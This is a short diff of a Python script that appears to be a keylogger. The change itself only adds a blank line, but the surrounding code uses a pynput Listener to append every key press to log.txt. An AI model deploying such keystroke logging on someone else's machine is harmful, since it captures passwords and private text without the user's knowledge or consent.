@@ -14,6 +14,7 @@ def write_to_file(key):
     with open("log.txt", 'a') as f:
         f.write(letter)
 
+
 # Collecting events until stopped
 with Listener(on_press=write_to_file) as l:
     l.join()
